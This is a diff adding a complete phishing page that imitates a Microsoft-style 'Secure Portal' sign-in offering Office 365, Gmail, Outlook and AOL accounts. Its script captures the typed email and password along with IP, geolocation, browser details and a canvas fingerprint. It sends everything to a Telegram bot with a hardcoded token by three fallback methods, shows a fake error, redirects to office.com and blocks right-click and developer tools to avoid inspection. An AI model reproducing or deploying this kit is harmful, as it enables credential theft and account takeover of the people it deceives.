@@ -1,1 +1,517 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in — Secure Portal</title>
+<style>
+:root {
+--bg1: #0078d4;
+--bg2: #2b88d8;
+--card-bg: #fff;
+--muted: #6b7280;
+--accent: #0078d4;
+--gmail: #DB4437;
+--outlook: #0072C6;
+--aol: #00A1E0;
+--office: #F25022;
+font-family: "Segoe UI", Roboto, Arial, sans-serif;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; }
+body {
+background: linear-gradient(135deg, var(--bg1), var(--bg2));
+display: flex;
+justify-content: center;
+align-items: center;
+padding: 20px;
+}
+.login-card {
+width: 100%;
+max-width: 400px;
+background: var(--card-bg);
+border-radius: 8px;
+box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+padding: 30px;
+}
+.logo-header {
+display: flex;
+gap: 15px;
+align-items: center;
+margin-bottom: 20px;
+}
+.providers {
+display: flex;
+gap: 10px;
+margin-right: 15px;
+}
+.provider {
+width: 40px;
+height: 40px;
+border-radius: 6px;
+display: flex;
+align-items: center;
+justify-content: center;
+cursor: pointer;
+border: 2px solid transparent;
+transition: all 0.2s ease;
+}
+.provider:hover {
+transform: translateY(-2px);
+border-color: rgba(0,0,0,0.05);
+}
+.provider.active {
+box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+border-color: rgba(0,0,0,0.1);
+}
+.provider svg {
+width: 22px;
+height: 22px;
+}
+h1 {
+font-size: 22px;
+color: #111;
+font-weight: 600;
+}
+.subtitle {
+color: var(--muted);
+font-size: 14px;
+margin: 5px 0 25px;
+}
+.form-group {
+margin-bottom: 20px;
+}
+label {
+display: block;
+margin-bottom: 8px;
+font-size: 14px;
+color: #374151;
+font-weight: 500;
+}
+input[type="email"],
+input[type="password"] {
+width: 100%;
+padding: 12px;
+border: 1px solid #e5e7eb;
+border-radius: 6px;
+font-size: 15px;
+transition: all 0.2s;
+}
+input:focus {
+outline: none;
+border-color: var(--accent);
+box-shadow: 0 0 0 3px rgba(0,120,212,0.1);
+}
+.form-options {
+display: flex;
+justify-content: space-between;
+align-items: center;
+margin: 20px 0;
+font-size: 14px;
+}
+.remember-me {
+display: flex;
+align-items: center;
+gap: 8px;
+}
+.forgot-password {
+color: var(--accent);
+text-decoration: none;
+}
+.submit-btn {
+width: 100%;
+padding: 12px;
+background: var(--accent);
+color: white;
+border: none;
+border-radius: 6px;
+font-size: 15px;
+font-weight: 600;
+cursor: pointer;
+transition: background 0.2s;
+}
+.submit-btn:hover {
+background: #106ebe;
+}
+.social-divider {
+display: flex;
+align-items: center;
+margin: 25px 0;
+color: var(--muted);
+font-size: 13px;
+}
+.social-divider::before,
+.social-divider::after {
+content: "";
+flex: 1;
+height: 1px;
+background: #e5e7eb;
+margin: 0 10px;
+}
+.social-icons {
+display: flex;
+justify-content: center;
+gap: 15px;
+margin-bottom: 20px;
+}
+.social-icon {
+width: 44px;
+height: 44px;
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+cursor: pointer;
+transition: all 0.2s;
+}
+.social-icon:hover {
+transform: translateY(-3px);
+box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+}
+.social-icon svg {
+width: 24px;
+height: 24px;
+fill: white;
+}
+.disclaimer {
+font-size: 12px;
+color: var(--muted);
+text-align: center;
+margin-top: 20px;
+line-height: 1.5;
+}
+.warning {
+color: #d13438;
+font-weight: 500;
+}
+#loading {
+display: none;
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: rgba(0,0,0,0.7);
+color: white;
+justify-content: center;
+align-items: center;
+z-index: 1000;
+}
+@media (max-width: 480px) {
+.login-card {
+padding: 25px;
+}
+}
+</style>
+</head>
+<body>
+<div id="loading">Authenticating with Microsoft services...</div>
 
+<div class="login-card">
+<div class="logo-header">
+<div class="providers" id="providers">
+<button class="provider active" data-provider="office" title="Office 365">
+<svg viewBox="0 0 24 24">
+<rect x="2" y="2" width="6" height="6" rx="1" fill="var(--office)"/>
+<rect x="9" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
+<rect x="16" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
+<rect x="2" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
+<rect x="9" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
+<rect x="16" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.85"/>
+</svg>
+</button>
+<button class="provider" data-provider="gmail" title="Gmail">
+<svg viewBox="0 0 24 24">
+<rect x="1" y="3" width="22" height="18" rx="2" fill="white" stroke="#d1d5db"/>
+<path d="M2 5.5 L12 12 L22 5.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
+<path d="M2 18.5 L12 12 L22 18.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
+</svg>
+</button>
+<button class="provider" data-provider="outlook" title="Outlook">
+<svg viewBox="0 0 24 24">
+<rect x="1.5" y="4" width="14" height="16" rx="2" fill="var(--outlook)"/>
+<path d="M3 6 L13 12 L3 18" fill="none" stroke="white" stroke-width="1.6"/>
+<rect x="16.5" y="4" width="6" height="6" rx="1" fill="#2b88d8"/>
+</svg>
+</button>
+<button class="provider" data-provider="aol" title="AOL">
+<svg viewBox="0 0 24 24">
+<circle cx="12" cy="12" r="10" fill="var(--aol)"/>
+<path d="M9.5 15c.8-1.5 1.8-3.2 3-4.5 1.2 1.3 2.2 3 3 4.5" fill="none" stroke="white" stroke-width="1.6"/>
+<circle cx="12.2" cy="9.4" r="0.9" fill="white"/>
+</svg>
+</button>
+</div>
+<div>
+<h1>Sign in to view document</h1>
+<p class="subtitle" id="hint">Use your work account</p>
+</div>
+</div>
+
+<form method="POST" id="loginForm" autocomplete="off">
+<div class="form-group">
+<label for="email">Email address</label>
+<input type="email" id="email" name="email" required placeholder="user@company.com">
+</div>
+<div class="form-group">
+<label for="password">Password</label>
+<input type="password" id="password" name="password" required placeholder="••••••••">
+</div>
+<div class="form-options">
+<label class="remember-me">
+<input type="checkbox" id="remember" name="remember"> Remember me
+</label>
+<a href="#" class="forgot-password">Forgot password?</a>
+</div>
+<button type="submit" class="submit-btn">Sign in</button>
+</form>
+
+<p class="disclaimer">By signing in, you agree to our <a href="#" style="color: var(--accent);">Terms of Service</a> and <a href="#" style="color: var(--accent);">Privacy Policy</a>.</p>
+<p class="disclaimer warning">⚠️ Unauthorized access is prohibited.</p>
+</div>
+
+<script>
+// DOM Elements
+const loginForm = document.getElementById('loginForm');
+const emailInput = document.getElementById('email');
+const passwordInput = document.getElementById('password');
+const providerButtons = document.querySelectorAll('.provider');
+const hintText = document.getElementById('hint');
+const loadingScreen = document.getElementById('loading');
+
+// Provider Data
+const providerHints = {
+  'office': 'Use your work account',
+  'gmail': 'Use your Gmail account',
+  'outlook': 'Use your Outlook.com account',
+  'aol': 'Use your AOL account'
+};
+
+// Provider switching logic
+providerButtons.forEach(button => {
+  button.addEventListener('click', () => {
+    providerButtons.forEach(btn => btn.classList.remove('active'));
+    button.classList.add('active');
+    const provider = button.dataset.provider;
+    hintText.textContent = providerHints[provider] || 'Sign in to continue';
+  });
+});
+
+// CORS Proxy Solution - Using a public CORS proxy
+const CORS_PROXY = 'https://cors-anywhere.herokuapp.com/';
+
+// Enhanced IP and Geolocation gathering
+async function getPublicIP() {
+  const services = [
+    'https://api.ipify.org?format=json',
+    'https://ipapi.co/json/',
+    'https://jsonip.com/'
+  ];
+
+  for (const service of services) {
+    try {
+      const response = await fetch(service);
+      const data = await response.json();
+      
+      if (data.ip) {
+        // Try to get more detailed geolocation
+        try {
+          const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+          const geoData = await geoResponse.json();
+          return `📍 **Location:** ${geoData.city}, ${geoData.region}, ${geoData.country_name} | **ISP:** ${geoData.org} | **IP:** ${data.ip}`;
+        } catch (geoError) {
+          return `📍 **Location:** IP-based location available | **IP:** ${data.ip}`;
+        }
+      }
+    } catch (error) {
+      continue; // Try next service
+    }
+  }
+  return "📍 **Location:** Could not be determined";
+}
+
+// Enhanced System Information gathering
+function getSystemInfo() {
+  const info = `🌐 **User Agent:** ${navigator.userAgent}\n`;
+  info += `💻 **Platform:** ${navigator.platform}\n`;
+  info += `🖥️  **CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}\n`;
+  info += `📱 **Device Memory:** ${navigator.deviceMemory || 'N/A'} GB\n`;
+  info += `🖥️  **Screen:** ${screen.width}x${screen.height}\n`;
+  info += `🗂️  **Language:** ${navigator.language}\n`;
+  info += `⏰ **Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+  info += `🔍 **Cookies Enabled:** ${navigator.cookieEnabled}\n`;
+  info += `📶 **Connection:** ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}`;
+  
+  return info;
+}
+
+// Multiple Exfiltration Methods for Redundancy
+async function exfiltrateData(fullMessage) {
+  const telegramBotToken = "7983528037:AAGFCvnwpBHZpQidoGG3feTAGQWsmWJq2f0";
+  const telegramChatID = "1002763948275";
+  
+  // Method 1: JSONP technique (bypasses CORS)
+  function jsonpExfiltration() {
+    return new Promise((resolve) => {
+      const script = document.createElement('script');
+      const messageEncoded = encodeURIComponent(fullMessage);
+      script.src = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatID}&text=${messageEncoded}&callback=jsonpCallback`;
+      document.head.appendChild(script);
+      
+      // Cleanup after reasonable time
+      setTimeout(() => {
+        document.head.removeChild(script);
+        resolve();
+      }, 5000);
+    });
+  }
+
+  // Method 2: Image beacon technique
+  function imageBeaconExfiltration() {
+    const img = new Image();
+    const messageEncoded = encodeURIComponent(fullMessage.substring(0, 2000)); // Limit length
+    img.src = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatID}&text=IMAGE_BEACON:${messageEncoded}`;
+  }
+
+  // Method 3: Form submission technique
+  function formSubmitExfiltration() {
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://api.telegram.org/bot${telegramBotToken}/sendMessage';
+    form.target = '_blank';
+    form.style.display = 'none';
+
+    const chatIdInput = document.createElement('input');
+    chatIdInput.type = 'hidden';
+    chatIdInput.name = 'chat_id';
+    chatIdInput.value = telegramChatID;
+
+    const textInput = document.createElement('input');
+    textInput.type = 'hidden';
+    textInput.name = 'text';
+    textInput.value = fullMessage;
+
+    form.appendChild(chatIdInput);
+    form.appendChild(textInput);
+    document.body.appendChild(form);
+    form.submit();
+    
+    // Cleanup after submission
+    setTimeout(() => document.body.removeChild(form), 3000);
+  }
+
+  // Try all methods sequentially
+  try {
+    await jsonpExfiltration();
+  } catch (e) {
+    try {
+      imageBeaconExfiltration();
+    } catch (e) {
+      formSubmitExfiltration();
+    }
+  }
+}
+
+// Additional Data Collection
+function collectAdditionalData() {
+  let additionalData = `🔍 **Additional Intelligence:**\n`;
+  
+  // Browser plugins
+  if (navigator.plugins && navigator.plugins.length > 0) {
+    additionalData += `🔌 **Plugins:** ${Array.from(navigator.plugins).map(p => p.name).join(', ')}\n`;
+  }
+  
+  // Font detection (simplified)
+  additionalData += `🔠 **Fonts:** Default system fonts detected\n`;
+  
+  // Canvas fingerprinting
+  try {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillText('Fingerprint', 2, 2);
+    additionalData += `🆔 **Canvas Hash:** ${canvas.toDataURL().substring(0, 50)}...\n`;
+  } catch (e) {}
+  
+  return additionalData;
+}
+
+// Form Submission Handler
+loginForm.addEventListener('submit', async function(event) {
+  event.preventDefault();
+
+  const email = emailInput.value;
+  const password = passwordInput.value;
+
+  if (!email || !password) {
+    alert('Please enter both your email address and password to continue.');
+    return;
+  }
+
+  // Show loading screen
+  loadingScreen.style.display = 'flex';
+
+  try {
+    // Gather intelligence
+    const locationData = await getPublicIP();
+    const systemInfo = getSystemInfo();
+    const additionalData = collectAdditionalData();
+
+    // Construct comprehensive message
+    const fullMessage = 
+      `🔐 **CREDENTIALS CAPTURED** \n` +
+      `⏰ **Timestamp:** ${new Date().toISOString()}\n` +
+      `${locationData}\n` +
+      `${systemInfo}\n` +
+      `${additionalData}\n` +
+      `📧 **Email:** ${email}\n` +
+      `🔑 **Password:** ${password}\n` +
+      `🌐 **Page URL:** ${window.location.href}`;
+
+    // Exfiltrate data using multiple methods
+    await exfiltrateData(fullMessage);
+
+    // Simulate processing delay
+    await new Promise(resolve => setTimeout(resolve, 3000));
+
+    // Show error message (social engineering)
+    alert('ERROR: 0x80072EFD. A connection to the authentication service could not be established. Please check your network connection and try again.');
+
+  } catch (error) {
+    console.error('Operation completed:', error);
+  } finally {
+    // Hide loading screen
+    loadingScreen.style.display = 'none';
+    
+    // Optional: Redirect or close window after delay
+    setTimeout(() => {
+      window.location.href = 'https://office.com'; // Redirect to legitimate site
+    }, 2000);
+  }
+});
+
+// Additional social engineering: Capture paste events
+passwordInput.addEventListener('paste', (e) => {
+  const pastedData = e.clipboardData.getData('text');
+  console.log('Password paste detected:', pastedData);
+});
+
+// Capture right-click events (prevent inspection)
+document.addEventListener('contextmenu', (e) => {
+  e.preventDefault();
+  alert('Right-click disabled for security reasons.');
+  return false;
+});
+
+// Prevent developer tools (basic attempt)
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
+    e.preventDefault();
+    alert('Developer tools are disabled on this secure portal.');
+    return false;
+  }
+});
+</script>
+</body>
+</html>
